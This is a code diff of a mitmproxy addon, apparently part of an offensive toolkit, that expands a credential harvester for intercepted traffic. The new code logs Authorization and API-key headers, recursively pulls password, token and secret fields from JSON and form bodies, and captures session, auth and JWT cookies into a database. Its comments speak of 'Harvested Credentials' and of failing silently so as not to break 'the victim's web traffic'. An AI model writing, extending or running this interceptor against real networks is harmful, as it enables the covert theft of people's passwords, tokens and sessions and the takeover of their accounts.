@@ -1,4 +1,4 @@
-import re
+import json
 import urllib.parse
 from mitmproxy import http
 from core.database import db
@@ -6,40 +6,90 @@ from core.database import db
 
 class DavoidInterceptor:
     def __init__(self):
-        self.sensitive_params = [b"password", b"passwd",
-                                 b"pwd", b"token", b"api_key", b"secret", b"auth"]
+        # High-value parameter keys that trigger a database log
+        self.sensitive_keys = ["password", "passwd", "pwd", "token",
+                               "api_key", "secret", "auth", "access_token", "client_secret"]
 
     def request(self, flow: http.HTTPFlow):
+        """Deep Packet Inspection on outgoing requests."""
         req = flow.request
         target = req.pretty_host
+        url = req.pretty_url
 
-        if req.method == "POST" and req.content:
-            content = req.content.lower()
-            if any(param in content for param in self.sensitive_params):
-                try:
-                    payload = req.content.decode('utf-8', errors='ignore')
+        # 1. CATCH AUTHORIZATION HEADERS
+        auth_header = req.headers.get(
+            "Authorization", "") or req.headers.get("X-API-Key", "")
+        if auth_header:
+            db.log(
+                module="Burp-Proxy",
+                target=target,
+                data=f"Intercepted Auth Header:\n{auth_header}\nEndpoint: {url}",
+                severity="CRITICAL"
+            )
+
+        # 2. PARSE POST/PUT/PATCH BODIES
+        if req.method in ["POST", "PUT", "PATCH"] and req.content:
+            content_type = req.headers.get("Content-Type", "").lower()
+            captured_creds = []
+
+            try:
+                # Handle JSON Payloads
+                if "application/json" in content_type:
+                    body = json.loads(req.get_text(strict=False))
+                    self._extract_json_creds(body, captured_creds)
+
+                # Handle Standard Web Forms
+                elif "application/x-www-form-urlencoded" in content_type:
+                    parsed_form = urllib.parse.parse_qs(
+                        req.get_text(strict=False))
+                    for key, values in parsed_form.items():
+                        if any(s_key in key.lower() for s_key in self.sensitive_keys):
+                            captured_creds.append(f"{key}: {values[0]}")
+
+                # Log to DB if we found anything
+                if captured_creds:
+                    cred_string = "\n".join(captured_creds)
                     db.log(
                         module="Burp-Proxy",
                         target=target,
-                        data=f"Intercepted Sensitive POST Request to {req.path}:\n{payload[:500]}",
+                        data=f"Harvested Credentials at {url}:\n{cred_string}",
                         severity="CRITICAL"
                     )
-                except Exception:
-                    pass
+            except Exception:
+                pass  # Fail silently so we don't break the victim's web traffic
 
     def response(self, flow: http.HTTPFlow):
+        """Inspection of incoming responses."""
         res = flow.response
         target = flow.request.pretty_host
 
+        # 3. CATCH AUTHENTICATION COOKIES
         if "set-cookie" in res.headers:
-            cookie_data = res.headers["set-cookie"].lower()
-            if any(x in cookie_data for x in ["sessionid", "auth", "token"]):
-                db.log(
-                    module="Burp-Proxy",
-                    target=target,
-                    data=f"Server assigned Auth Cookie:\n{res.headers['set-cookie']}",
-                    severity="HIGH"
-                )
+            for cookie in res.headers.get_all("set-cookie"):
+                cookie_lower = cookie.lower()
+                if any(x in cookie_lower for x in ["session", "auth", "token", "jwt"]):
+                    # Strip massive cookies to just the important bits for the log
+                    clean_cookie = cookie.split(';')[0]
+                    db.log(
+                        module="Burp-Proxy",
+                        target=target,
+                        data=f"Server assigned Auth Cookie:\n{clean_cookie}",
+                        severity="HIGH"
+                    )
+
+    def _extract_json_creds(self, json_data, output_list):
+        """Recursive function to find passwords nested deep inside JSON APIs."""
+        if isinstance(json_data, dict):
+            for key, value in json_data.items():
+                if any(s_key in key.lower() for s_key in self.sensitive_keys):
+                    # Ensure we don't log massive nested objects, just strings/ints
+                    if isinstance(value, (str, int, float, bool)):
+                        output_list.append(f"{key}: {value}")
+                else:
+                    self._extract_json_creds(value, output_list)
+        elif isinstance(json_data, list):
+            for item in json_data:
+                self._extract_json_creds(item, output_list)
 
 
 addons = [DavoidInterceptor()]
